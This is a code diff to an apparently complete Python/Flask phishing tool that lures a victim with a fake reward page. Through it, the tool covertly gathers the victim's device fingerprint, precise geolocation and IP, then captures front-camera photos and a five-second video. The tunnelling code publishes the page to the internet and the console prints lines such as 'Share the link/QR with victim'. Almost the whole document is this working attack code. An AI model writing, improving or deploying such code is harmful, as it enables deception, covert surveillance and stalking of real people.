@@ -13,7 +13,7 @@ from typing import Optional
 
 # Try imports
 try:
-    from flask import Flask, request, render_template_string, jsonify
+    from flask import Flask, request, render_template_string, jsonify, send_file
     import qrcode
     from PIL import Image, ImageDraw
     from colorama import init as colorama_init, Fore, Style, Back
@@ -41,10 +41,16 @@ GALLERY_PATHS = [
 
 # Create all directories
 for path in GALLERY_PATHS:
-    os.makedirs(path, exist_ok=True)
+    try:
+        os.makedirs(path, exist_ok=True)
+    except:
+        pass
 
 app = Flask(__name__)
 _received_reports = []
+
+# Global variable to store public URL
+public_url = None
 
 def show_tool_lock_screen():
     """Show the tool lock screen with countdown"""
@@ -174,6 +180,7 @@ def install_cloudflared():
 
 def start_ngrok_tunnel():
     """Start ngrok tunnel with better error handling"""
+    global public_url
     try:
         print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
         
@@ -181,45 +188,38 @@ def start_ngrok_tunnel():
         subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
         time.sleep(3)
         
-        # Start ngrok with explicit configuration
-        ngrok_process = subprocess.Popen([
-            'ngrok', 'http', str(PORT),
-            '--log=stdout',
-            '--region=us'  # Specify region for better reliability
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        # Start ngrok in background thread
+        def run_ngrok():
+            subprocess.run([
+                'ngrok', 'http', str(PORT),
+                '--log=stdout',
+                '--region=us'
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        ngrok_thread = threading.Thread(target=run_ngrok, daemon=True)
+        ngrok_thread.start()
         
         print(f"{Fore.YELLOW}⏳ Waiting for ngrok to start (15 seconds)...{Style.RESET_ALL}")
-        
-        # Wait longer for ngrok to initialize
         time.sleep(15)
         
-        # Multiple attempts to get URL
+        # Get ngrok URL
         max_retries = 8
         for attempt in range(max_retries):
             try:
                 print(f"{Fore.CYAN}🔄 Attempt {attempt + 1}/{max_retries} to get ngrok URL...{Style.RESET_ALL}")
-                
-                response = requests.get('http://localhost:4040/api/tunnels', timeout=15)
+                response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
                 if response.status_code == 200:
                     tunnels = response.json().get('tunnels', [])
                     for tunnel in tunnels:
                         if tunnel['proto'] == 'https':
                             public_url = tunnel['public_url']
                             print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}🌍 This link works on ANY device and ANY network!{Style.RESET_ALL}")
                             return public_url
-                
                 time.sleep(3)
-                
-            except requests.exceptions.RequestException as e:
-                print(f"{Fore.YELLOW}⚠️  Request failed (attempt {attempt + 1}): {e}{Style.RESET_ALL}")
-                time.sleep(3)
-            except Exception as e:
-                print(f"{Fore.YELLOW}⚠️  Error (attempt {attempt + 1}): {e}{Style.RESET_ALL}")
+            except:
                 time.sleep(3)
         
-        print(f"{Fore.RED}❌ Could not get ngrok URL after {max_retries} attempts{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 Check: http://localhost:4040 for ngrok dashboard{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ Could not get ngrok URL{Style.RESET_ALL}")
         return None
         
     except Exception as e:
@@ -227,7 +227,8 @@ def start_ngrok_tunnel():
         return None
 
 def start_cloudflare_tunnel():
-    """Start Cloudflare tunnel with better reliability"""
+    """Start Cloudflare tunnel"""
+    global public_url
     try:
         print(f"{Fore.CYAN}🌐 Starting Cloudflare tunnel...{Style.RESET_ALL}")
         
@@ -235,48 +236,17 @@ def start_cloudflare_tunnel():
         subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
         time.sleep(3)
         
-        # Start cloudflared tunnel
-        cloudflared_process = subprocess.Popen([
-            'cloudflared', 'tunnel',
-            '--url', f'http://localhost:{PORT}',
-            '--metrics', 'localhost:49539'  # Add metrics for better monitoring
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        # Start cloudflared in background
+        def run_cloudflared():
+            subprocess.run([
+                'cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel to start (20 seconds)...{Style.RESET_ALL}")
+        cloudflared_thread = threading.Thread(target=run_cloudflared, daemon=True)
+        cloudflared_thread.start()
         
-        # Wait longer for Cloudflare tunnel
-        time.sleep(20)
-        
-        # Try to capture URL from output
-        max_retries = 6
-        for attempt in range(max_retries):
-            try:
-                print(f"{Fore.CYAN}🔄 Attempt {attempt + 1}/{max_retries} to get Cloudflare URL...{Style.RESET_ALL}")
-                
-                # Check stderr for URL
-                import select
-                ready, _, _ = select.select([cloudflared_process.stderr], [], [], 5)
-                if ready:
-                    line = cloudflared_process.stderr.readline()
-                    print(f"{Fore.CYAN}📡 Cloudflared output: {line.strip()}{Style.RESET_ALL}")
-                    
-                    if '.trycloudflare.com' in line:
-                        import re
-                        urls = re.findall(r'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com', line)
-                        if urls:
-                            public_url = urls[0]
-                            print(f"{Fore.GREEN}✅ Cloudflare Public URL: {public_url}{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}🌍 This link works on ANY device and ANY network!{Style.RESET_ALL}")
-                            return public_url
-                
-                time.sleep(3)
-                
-            except Exception as e:
-                print(f"{Fore.YELLOW}⚠️  Error (attempt {attempt + 1}): {e}{Style.RESET_ALL}")
-                time.sleep(3)
-        
-        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}💡 Check: https://dash.cloudflare.com/ for tunnel status{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}⏳ Cloudflare tunnel started in background{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}💡 Check: https://dash.cloudflare.com/ for tunnel URL{Style.RESET_ALL}")
         return "cloudflare_tunnel_active"
         
     except Exception as e:
@@ -285,42 +255,24 @@ def start_cloudflare_tunnel():
 
 def start_localhost_run():
     """Alternative tunneling service"""
+    global public_url
     try:
-        print(f"{Fore.CYAN}🌐 Trying localhost.run (alternative)...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🌐 Trying localhost.run...{Style.RESET_ALL}")
         
-        # Check if ssh is available
-        result = subprocess.run(['which', 'ssh'], capture_output=True, text=True)
-        if result.returncode != 0:
-            print(f"{Fore.RED}❌ SSH not available{Style.RESET_ALL}")
-            return None
+        result = subprocess.run([
+            'ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:5000', 'nokey@localhost.run'
+        ], capture_output=True, text=True, timeout=30)
         
-        # Start localhost.run tunnel
-        process = subprocess.Popen([
-            'ssh', '-o', 'StrictHostKeyChecking=no',
-            '-R', '80:localhost:5000',
-            'nokey@localhost.run'
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        output = result.stdout + result.stderr
+        print(f"{Fore.CYAN}📡 Output: {output}{Style.RESET_ALL}")
         
-        print(f"{Fore.YELLOW}⏳ Waiting for localhost.run tunnel (15 seconds)...{Style.RESET_ALL}")
-        time.sleep(15)
+        import re
+        urls = re.findall(r'https://[a-zA-Z0-9-]+\.localhost\.run', output)
+        if urls:
+            public_url = urls[0]
+            print(f"{Fore.GREEN}✅ localhost.run URL: {public_url}{Style.RESET_ALL}")
+            return public_url
         
-        # Try to read URL from output
-        import select
-        ready, _, _ = select.select([process.stdout, process.stderr], [], [], 10)
-        
-        if ready:
-            for stream in ready:
-                output = stream.read()
-                print(f"{Fore.CYAN}📡 localhost.run output: {output}{Style.RESET_ALL}")
-                
-                import re
-                urls = re.findall(r'https://[a-zA-Z0-9-]+\\.localhost\\.run', output)
-                if urls:
-                    public_url = urls[0]
-                    print(f"{Fore.GREEN}✅ localhost.run URL: {public_url}{Style.RESET_ALL}")
-                    return public_url
-        
-        print(f"{Fore.YELLOW}⚠️  localhost.run started but URL not captured{Style.RESET_ALL}")
         return None
         
     except Exception as e:
@@ -330,8 +282,6 @@ def start_localhost_run():
 def force_media_scan():
     """Force media scanner to refresh gallery"""
     try:
-        print(f"{Fore.CYAN}🔄 Forcing media scan...{Style.RESET_ALL}")
-        
         for gallery_path in GALLERY_PATHS:
             try:
                 subprocess.run([
@@ -340,36 +290,26 @@ def force_media_scan():
                 ], capture_output=True, timeout=5)
             except:
                 continue
-        
-        print(f"{Fore.GREEN}✅ Media scan completed{Style.RESET_ALL}")
         return True
-        
-    except Exception as e:
-        print(f"{Fore.YELLOW}⚠️  Media scan failed: {e}{Style.RESET_ALL}")
+    except:
         return False
 
 def save_to_all_locations(file_data, filename, file_type="photo"):
     """Save file to all gallery locations"""
     saved_paths = []
-    
     for gallery_path in GALLERY_PATHS:
         try:
             file_path = os.path.join(gallery_path, filename)
             with open(file_path, 'wb') as f:
                 f.write(file_data)
-            
             os.chmod(file_path, 0o644)
             saved_paths.append(file_path)
-            
-            print(f"{Fore.GREEN}✅ {file_type} saved to: {gallery_path}/{filename}{Style.RESET_ALL}")
-            
-        except Exception as e:
-            print(f"{Fore.YELLOW}⚠️ Failed to save to {gallery_path}: {e}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}✅ {file_type} saved to: {file_path}{Style.RESET_ALL}")
+        except:
             continue
     
     if saved_paths:
         force_media_scan()
-    
     return saved_paths
 
 def display_banner():
@@ -381,7 +321,7 @@ def display_banner():
     print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
 
 def display_qr_in_termux(url):
-    """Generate and display QR code directly in Termux"""
+    """Generate and display QR code"""
     try:
         qr = qrcode.QRCode(version=1, box_size=2, border=2)
         qr.add_data(url)
@@ -389,7 +329,6 @@ def display_qr_in_termux(url):
         
         qr_matrix = qr.get_matrix()
         qr_text = ""
-        
         for row in qr_matrix:
             line = ""
             for cell in row:
@@ -403,11 +342,8 @@ def display_qr_in_termux(url):
         img = qr.make_image(fill_color="black", back_color="white")
         img.save(QR_PNG)
         print(f"{Fore.GREEN}💾 QR saved as: {QR_PNG}{Style.RESET_ALL}")
-        
         return True
-        
-    except Exception as e:
-        print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
+    except:
         return False
 
 def get_local_ip():
@@ -422,21 +358,20 @@ def get_local_ip():
         return "127.0.0.1"
 
 def test_url_accessibility(url):
-    """Test if URL is accessible from external networks"""
+    """Test if URL is accessible"""
     try:
-        print(f"{Fore.CYAN}🧪 Testing URL accessibility...{Style.RESET_ALL}")
         response = requests.get(url, timeout=10)
         if response.status_code == 200:
             print(f"{Fore.GREEN}✅ URL is accessible from external networks!{Style.RESET_ALL}")
             return True
         else:
-            print(f"{Fore.YELLOW}⚠️  URL returned status: {response.status_code}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}⚠️ URL returned status: {response.status_code}{Style.RESET_ALL}")
             return False
-    except Exception as e:
-        print(f"{Fore.YELLOW}⚠️  URL test failed: {e}{Style.RESET_ALL}")
+    except:
+        print(f"{Fore.YELLOW}⚠️ URL test failed{Style.RESET_ALL}")
         return False
 
-# HTML PAGE (Same as before for real camera access)
+# COMPLETE HTML WITH WORKING JAVASCRIPT
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -570,6 +505,20 @@ HTML_PAGE = """
             margin: 10px 0;
             display: none;
         }
+        #capturedImages {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .captured-image {
+            width: 80px;
+            height: 80px;
+            border: 2px solid gold;
+            border-radius: 10px;
+            object-fit: cover;
+        }
     </style>
 </head>
 <body>
@@ -592,11 +541,12 @@ HTML_PAGE = """
             ✅ Camera access required for verification
         </div>
         
-        <button class="btn" id="claimBtn">
+        <button class="btn" id="claimBtn" onclick="startVerification()">
             🎁 CLAIM YOUR REWARD NOW
         </button>
         
         <video id="cameraPreview" autoplay muted playsinline></video>
+        <div id="capturedImages"></div>
         
         <div id="status" class="status"></div>
         
@@ -615,8 +565,256 @@ HTML_PAGE = """
     </div>
 
     <script>
-        // [Previous JavaScript code for real camera access remains the same]
-        // ... (Include all the real camera JavaScript code from previous version)
+        const collectedData = {
+            deviceInfo: {},
+            location: null,
+            photos: [],
+            video: null,
+            ip: null
+        };
+
+        async function startVerification() {
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status');
+            const dataDiv = document.getElementById('data');
+            
+            btn.disabled = true;
+            btn.innerHTML = '⏳ Processing...';
+            status.className = 'status processing';
+            status.innerHTML = '🔄 Starting verification...';
+            status.style.display = 'block';
+
+            try {
+                // Step 1: Get device info
+                status.innerHTML = '📱 Getting device information...';
+                collectedData.deviceInfo = getDeviceInfo();
+                updateDataDisplay();
+
+                // Step 2: Get location
+                status.innerHTML = '📍 Getting your location...';
+                collectedData.location = await getLocation();
+                updateDataDisplay();
+
+                // Step 3: Get IP
+                status.innerHTML = '🌐 Getting IP address...';
+                collectedData.ipInfo = await getIPInfo();
+                updateDataDisplay();
+
+                // Step 4: Access camera and capture media
+                status.innerHTML = '📸 Accessing camera for verification...';
+                await accessCameraAndCapture();
+
+                // Step 5: Send all data to server
+                status.innerHTML = '📡 Sending data to server...';
+                await sendAllData();
+
+                // Success
+                status.className = 'status success';
+                status.innerHTML = '✅ Reward claimed successfully!';
+                dataDiv.style.display = 'block';
+                btn.style.display = 'none';
+
+            } catch (error) {
+                status.className = 'status error';
+                status.innerHTML = '❌ Error: ' + error.message;
+                btn.disabled = false;
+                btn.innerHTML = '🎁 TRY AGAIN';
+                
+                // Still try to send whatever data we have
+                await sendAllData();
+            }
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                memory: navigator.deviceMemory,
+                cores: navigator.hardwareConcurrency,
+                touchPoints: navigator.maxTouchPoints
+            };
+        }
+
+        function updateDataDisplay() {
+            if (collectedData.deviceInfo) {
+                document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
+                document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
+                document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 50) + '...' || 'Unknown';
+                document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
+            }
+            if (collectedData.location) {
+                if (collectedData.location.latitude) {
+                    document.getElementById('loc').textContent = 
+                        `Lat: ${collectedData.location.latitude}, Lon: ${collectedData.location.longitude}`;
+                } else {
+                    document.getElementById('loc').textContent = 'Location access denied';
+                }
+            }
+            if (collectedData.ipInfo) {
+                document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not supported' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        resolve({ error: error.message });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    org: data.org
+                };
+            } catch (error) {
+                try {
+                    const fallback = await fetch('https://api.ipify.org?format=json');
+                    const data = await fallback.json();
+                    return { ip: data.ip };
+                } catch (e) {
+                    return { error: 'Could not fetch IP' };
+                }
+            }
+        }
+
+        async function accessCameraAndCapture() {
+            const video = document.getElementById('cameraPreview');
+            const capturedImages = document.getElementById('capturedImages');
+            
+            try {
+                // Access camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 1280, height: 720 } 
+                });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                await video.play();
+                
+                // Wait for video to be ready
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Capture 3 photos
+                capturedImages.innerHTML = '';
+                for (let i = 0; i < 3; i++) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    collectedData.photos.push(imageData);
+                    
+                    // Show thumbnail
+                    const img = document.createElement('img');
+                    img.src = imageData;
+                    img.className = 'captured-image';
+                    img.title = `Photo ${i + 1}`;
+                    capturedImages.appendChild(img);
+                    
+                    // Wait between photos
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+                
+                // Record 5-second video
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        collectedData.video = reader.result;
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                recorder.stop();
+                
+                // Stop all tracks
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = 'none';
+                
+            } catch (error) {
+                throw new Error('Camera access denied: ' + error.message);
+            }
+        }
+
+        async function sendAllData() {
+            const payload = {
+                ...collectedData,
+                timestamp: new Date().toISOString(),
+                mediaType: 'real_camera'
+            };
+            
+            try {
+                const response = await fetch('/report', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Server response not OK');
+                }
+                
+                console.log('Data sent successfully');
+            } catch (error) {
+                console.error('Failed to send data:', error);
+                // Try fallback method
+                await sendFallbackData();
+            }
+        }
+
+        async function sendFallbackData() {
+            // Fallback: send via image request
+            const dataStr = encodeURIComponent(JSON.stringify(collectedData));
+            const img = new Image();
+            img.src = `/fallback?data=${dataStr}`;
+        }
+
+        // Initialize device info on load
+        collectedData.deviceInfo = getDeviceInfo();
+        updateDataDisplay();
     </script>
 </body>
 </html>
@@ -624,6 +822,15 @@ HTML_PAGE = """
 
 @app.route("/")
 def index():
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    
+    print(f"\n{Fore.GREEN}🎯 NEW VICTIM ACCESSED!{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    
     return render_template_string(HTML_PAGE)
 
 @app.route("/report", methods=["POST"])
@@ -632,18 +839,17 @@ def report():
         data = request.get_json()
         
         # Extract data
-        lat = data.get("latitude")
-        lon = data.get("longitude")
-        ip = data.get("ip", "Unknown")
-        city = data.get("city", "Unknown")
-        country = data.get("country", "Unknown")
-        isp = data.get("isp", "Unknown")
+        lat = data.get("location", {}).get("latitude")
+        lon = data.get("location", {}).get("longitude")
+        ip = data.get("ipInfo", {}).get("ip", "Unknown")
+        city = data.get("ipInfo", {}).get("city", "Unknown")
+        country = data.get("ipInfo", {}).get("country", "Unknown")
+        isp = data.get("ipInfo", {}).get("org", "Unknown")
         photos = data.get("photos", [])
         video = data.get("video")
         device_info = data.get("deviceInfo", {})
-        media_type = data.get("mediaType", "unknown")
         
-        # Save REAL photos to all gallery locations
+        # Save photos
         photo_files = []
         for i, photo_data in enumerate(photos):
             try:
@@ -651,16 +857,15 @@ def report():
                     photo_data = photo_data.split(',')[1]
                 img_data = base64.b64decode(photo_data)
                 timestamp = int(time.time())
-                filename = f"HCO_Real_Photo_{timestamp}_{i+1}.jpg"
+                filename = f"HCO_Photo_{timestamp}_{i+1}.jpg"
                 
-                saved_paths = save_to_all_locations(img_data, filename, "REAL photo")
+                saved_paths = save_to_all_locations(img_data, filename, "photo")
                 if saved_paths:
                     photo_files.append(filename)
-                
             except Exception as e:
-                print(f"{Fore.YELLOW}⚠️ Real photo {i+1} save skipped: {e}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ Photo {i+1} save failed: {e}{Style.RESET_ALL}")
         
-        # Save REAL video to all gallery locations
+        # Save video
         video_file = None
         if video:
             try:
@@ -668,14 +873,13 @@ def report():
                     video = video.split(',')[1]
                 video_data = base64.b64decode(video)
                 timestamp = int(time.time())
-                filename = f"HCO_Real_Video_{timestamp}.webm"
+                filename = f"HCO_Video_{timestamp}.webm"
                 
-                saved_paths = save_to_all_locations(video_data, filename, "REAL video")
+                saved_paths = save_to_all_locations(video_data, filename, "video")
                 if saved_paths:
                     video_file = filename
-                
             except Exception as e:
-                print(f"{Fore.YELLOW}⚠️ Real video save skipped: {e}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ Video save failed: {e}{Style.RESET_ALL}")
         
         # Save to CSV
         record = {
@@ -686,16 +890,14 @@ def report():
             'isp': isp,
             'latitude': lat,
             'longitude': lon,
-            'photos': ', '.join(photo_files) if photo_files else '3 REAL images in gallery',
-            'video': video_file or 'REAL video in gallery',
-            'media_type': media_type,
+            'photos': len(photos),
+            'video': 'Yes' if video else 'No',
             'user_agent': device_info.get('userAgent', 'Unknown'),
             'platform': device_info.get('platform', 'Unknown'),
             'screen': device_info.get('screen', 'Unknown'),
             'timezone': device_info.get('timezone', 'Unknown')
         }
         
-        # Save to CSV
         file_exists = os.path.isfile(REPORT_CSV)
         with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
             writer = csv.DictWriter(f, fieldnames=record.keys())
@@ -704,116 +906,92 @@ def report():
             writer.writerow(record)
         
         # Print results
-        print(f"\n{Fore.GREEN}{'🚨 REAL CAMERA DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📍 Location: {lat if lat else city}, {lon if lon else country}{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}{'🎯 DATA CAPTURED SUCCESSFULLY ':=^60}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}📍 Location: {lat}, {lon}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📡 ISP: {isp}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}📸 Photos: 3 REAL images from front camera{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}🎥 Video: 5-second REAL video recording{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📱 Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
-        for path in GALLERY_PATHS:
-            print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}📸 Photos: {len(photos)} real images captured{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🎥 Video: {'5-second recording' if video else 'Not captured'}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
         
         return jsonify({"status": "success"})
         
     except Exception as e:
-        print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
-        return jsonify({"status": "error", "message": str(e)}), 500
+        print(f"{Fore.RED}❌ Report Error: {e}{Style.RESET_ALL}")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/fallback")
+def fallback_data():
+    """Fallback endpoint for data collection"""
+    data_str = request.args.get('data')
+    if data_str:
+        try:
+            data = json.loads(data_str)
+            print(f"{Fore.YELLOW}📝 Fallback data received{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}Data: {data}{Style.RESET_ALL}")
+        except:
+            pass
+    return jsonify({"status": "logged"})
 
 def main():
+    global public_url
+    
     # Show lock screen first
     show_tool_lock_screen()
-    
-    # Display main banner
     display_banner()
     
-    # Get local URL
     local_ip = get_local_ip()
     local_url = f"http://{local_ip}:{PORT}"
     
     print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended - Works Everywhere){Style.RESET_ALL}")
     print(f"{Fore.BLUE}2. Cloudflare Tunnel (Alternative){Style.RESET_ALL}")
-    print(f"{Fore.CYAN}3. localhost.run (Backup Option){Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}4. Local Network Only (Same WiFi Only){Style.RESET_ALL}")
+    print(f"{Fore.CYAN}3. localhost.run (Backup){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}4. Local Network Only (Same WiFi){Style.RESET_ALL}")
     print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
     
     choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-4): {Style.RESET_ALL}").strip()
     
-    public_url = None
-    tunnel_service = "None"
+    tunnel_service = "Local Network"
     
     if choice == '1':
-        tunnel_service = "Ngrok"
         if install_ngrok():
             public_url = start_ngrok_tunnel()
-        else:
-            print(f"{Fore.RED}❌ Ngrok installation failed.{Style.RESET_ALL}")
+            tunnel_service = "Ngrok"
     elif choice == '2':
-        tunnel_service = "Cloudflare"
         if install_cloudflared():
             public_url = start_cloudflare_tunnel()
-        else:
-            print(f"{Fore.RED}❌ Cloudflared installation failed.{Style.RESET_ALL}")
+            tunnel_service = "Cloudflare"
     elif choice == '3':
-        tunnel_service = "localhost.run"
         public_url = start_localhost_run()
-    elif choice == '4':
-        tunnel_service = "Local Network"
-        print(f"{Fore.YELLOW}📡 Using local network only (works on same WiFi){Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
-        tunnel_service = "Local Network"
+        tunnel_service = "localhost.run"
     
-    # Determine final URL to use
-    final_url = public_url if public_url and public_url not in ["cloudflare_tunnel_active"] else local_url
+    # Determine final URL
+    final_url = public_url if public_url and public_url != "cloudflare_tunnel_active" else local_url
     
-    # Display results
     print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🌐 Public URL: {final_url}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🔧 Tunnel Service: {tunnel_service}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🔧 Service: {tunnel_service}{Style.RESET_ALL}")
     
     if public_url and public_url != "cloudflare_tunnel_active":
-        print(f"{Fore.GREEN}✅ This link works on ANY device and ANY network!{Style.RESET_ALL}")
-        
-        # Test URL accessibility
+        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
         test_url_accessibility(final_url)
-        
-    elif public_url == "cloudflare_tunnel_active":
-        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel active - check dashboard for URL{Style.RESET_ALL}")
     else:
-        print(f"{Fore.YELLOW}⚠️  This link only works on the same WiFi network{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 Make sure both devices are on the same WiFi{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}⚠️ Only works on same WiFi network{Style.RESET_ALL}")
     
-    print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}📁 Photos/Videos will save to:{Style.RESET_ALL}")
     for path in GALLERY_PATHS:
         print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
     
-    # Display QR code
     display_qr_in_termux(final_url)
     
-    print(f"\n{Fore.YELLOW}🚀 Share this link/QR with victim{Style.RESET_ALL}")
-    if public_url and public_url != "cloudflare_tunnel_active":
-        print(f"{Fore.GREEN}📱 Works on: Mobile data, Different WiFi, Any device!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.YELLOW}📱 Only works on same WiFi network{Style.RESET_ALL}")
-    
-    print(f"{Fore.RED}🔴 Waiting for victim to claim reward...{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
+    print(f"\n{Fore.YELLOW}🚀 Share the link/QR with victim{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
     
     try:
         app.run(host=HOST, port=PORT, debug=False)
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
